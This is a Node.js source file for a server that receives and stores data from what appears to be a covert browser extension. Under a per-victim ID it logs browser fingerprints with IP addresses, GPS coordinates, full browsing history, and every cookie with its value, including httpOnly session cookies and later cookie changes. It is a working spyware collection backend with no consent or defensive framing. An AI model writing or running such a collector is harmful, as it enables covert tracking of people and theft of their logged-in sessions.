// Import modules.
var express    = require('express')
  , app        = express()
  , server     = require('http').createServer(app)
  , sio        = require('socket.io')
  , io         = sio.listen(server, { log: false })
  , db         = require('sqlite-wrapper')('activity.db')
  // , crypto     = require('cryptojs').Crypto
  // , lzs        = require('lz-string')
  ;

// Start server.
server.listen(8080);

///////////////////////////////////////////////////////////////////////////////
// WebSockets handling.
///////////////////////////////////////////////////////////////////////////////

io.sockets.on('connection', function (socket) {
    // Get browser fingerprint (DB: Fingerprints).
    socket.on('addFingerprint', function (data) {
        addFingerprint(data, socket.handshake.address.address);
        console.log(data.uuid, '[+] Fingerprint');
    });
    // Get current location (DB: Geopositions).
    socket.on('addGeoposition', function (data) {
        addGeoposition(data);
        console.log(data.uuid, '[+] Geoposition');
    });
    // Get URL visit (DB: History).
    socket.on('addURLVisit', function (data) {
        addURLVisit(data);
        console.log(data.uuid, '[+] URL Visit');
    });
    // Get URL removal (DB: History).
    socket.on('removeURL', function (data) {
        removeURL(data);
        console.log(data.uuid, '[+] URL Removal');
    });
    // Add all cookies (DB: Cookies).
    socket.on('addAllCookies', function (data) {
        addAllCookies(data);
        console.log(data.uuid, '[+] All Cookies');
    });
    // Add cookie change (DB: Cookies).
    socket.on('addCookieChange', function (data) {
        addCookieChange(data);
        console.log(data.uuid, '[+] Cookie Change');
    });
});

var getPayload = function (data) {
    if (data.payload !== "null") {
        return JSON.parse(lzs.decompress(data.payload));
    } else {
        return null;
    }
};

///////////////////////////////////////////////////////////////////////////////
// Database handling.
///////////////////////////////////////////////////////////////////////////////

db.createTable('Fingerprints', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'ipAddress':        {type: 'TEXT'},
    'userAgent':        {type: 'TEXT'},
    'screenResolution': {type: 'TEXT'}
});

var addFingerprint = function (data, ipAddress) {
    var payload = JSON.parse(data.payload);
    db.insert('Fingerprints', {
        timestamp: data.time,
        uuid: data.uuid,
        ipAddress: ipAddress,
        userAgent: payload.userAgent,
        screenResolution: payload.screenResolution
    });
};

db.createTable('Geopositions', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'latitude':         {type: 'REAL'},
    'longitude':        {type: 'REAL'},
    'accuracy':         {type: 'INTEGER'},
    'altitude':         {type: 'INTEGER'},
    'altitudeAccuracy': {type: 'REAL'},
    'heading':          {type: 'REAL'},
    'speed':            {type: 'REAL'}
});

var addGeoposition = function (data) {
    if (data.payload === "null") {
        var payload = { coords: {} };
    } else {
        var payload = JSON.parse(data.payload);
    }
    db.insert('Geopositions', {
        timestamp: data.time,
        uuid: data.uuid,
        latitude: payload.coords.latitude,
        longitude: payload.coords.longitude,
        accuracy: payload.coords.accuracy,
        altitude: payload.coords.altitude,
        altitudeAccuracy: payload.coords.altitudeAccuracy,
        heading: payload.coords.heading,
        speed: payload.coords.speed
    });
};

db.createTable('History', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'id':               {type: 'TEXT'},
    'title':            {type: 'TEXT'},
    'url':              {type: 'TEXT'},
    'lastVisitTime':    {type: 'INTEGER'},
    'typedCount':       {type: 'INTEGER'},
    'visitCount':       {type: 'INTEGER'},
    'removed':          {type: 'INTEGER'}
});

var addURLVisit = function (data) {
    var payload = JSON.parse(data.payload);
    db.insert('History', {
        timestamp: data.time,
        uuid: data.uuid,
        id: payload.id,
        title: payload.title,
        url: payload.url,
        lastVisitTime: Math.floor(payload.lastVisitTime),
        typedCount: payload.typedCount,
        visitCount: payload.visitCount,
        removed: 0
    });
};

var removeURL = function (data) {
    var payload = JSON.parse(data.payload);
    payload.urls.forEach(function (entry) {
        db.update('History', 'url=?', [entry], { removed : 1 });
    });
};

db.createTable('Cookies', {
    'timestamp':        {type: 'INTEGER'},
    'uuid':             {type: 'TEXT'},
    'cause':            {type: 'TEXT'},
    'name':             {type: 'TEXT'},
    'value':            {type: 'TEXT'},
    'domain':           {type: 'TEXT'},
    'hostOnly':         {type: 'INTEGER'},
    'path':             {type: 'TEXT'},
    'secure':           {type: 'INTEGER'},
    'httpOnly':         {type: 'INTEGER'},
    'session':          {type: 'INTEGER'},
    'expirationDate':   {type: 'REAL'},
    'storeId':          {type: 'TEXT'},
    'removed':          {type: 'INTEGER'}
});

var addAllCookies = function (data) {
    var payload = JSON.parse(data.payload);
    payload.forEach(function (entry) {
        db.insert('Cookies', {
            timestamp: data.time,
            uuid: data.uuid,
            cause: "explicit",
            name: entry.name,
            value: entry.value,
            domain: entry.domain,
            hostOnly: entry.hostOnly ? 1 : 0,
            path: entry.path,
            secure: entry.secure ? 1 : 0,
            httpOnly: entry.httpOnly ? 1 : 0,
            session: entry.session ? 1 : 0,
            expirationDate: entry.expirationDate,
            storeId: entry.storeId,
            removed: 0
        });
    });
};

var addCookieChange = function (data) {
    var payload = JSON.parse(data.payload);
    db.insert('Cookies', {
        timestamp: data.time,
        uuid: data.uuid,
        cause: payload.cause,
        name: payload.cookie.name,
        value: payload.cookie.value,
        domain: payload.cookie.domain,
        hostOnly: payload.cookie.hostOnly ? 1 : 0,
        path: payload.cookie.path,
        secure: payload.cookie.secure ? 1 : 0,
        httpOnly: payload.cookie.httpOnly ? 1 : 0,
        session: payload.cookie.session ? 1 : 0,
        expirationDate: payload.cookie.expirationDate,
        storeId: payload.cookie.storeId,
        removed: payload.removed ? 1 : 0
    });
};

var addAllBookmarks = function (data) {
    ;
};

var addBookmark = function (data) {
    ;
};

var updateBookmark = function (data) {
    ;
};
